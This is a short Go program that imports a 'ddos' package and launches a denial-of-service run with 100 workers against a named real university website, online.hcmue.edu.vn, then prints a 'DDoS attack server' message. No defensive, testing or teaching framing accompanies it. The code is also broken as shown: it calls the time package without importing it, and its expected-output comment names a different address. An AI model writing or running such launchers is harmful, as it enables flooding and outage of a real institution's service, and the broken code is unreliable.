package main
import (
	"fmt"
		"greeter/ddos"
	)

func main() {
	workers := 100
	d, err := ddos.New("https://online.hcmue.edu.vn", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: https://online.hcmue.edu.vn")
	// Output: DDoS attack server: http://127.0.0.1:80
}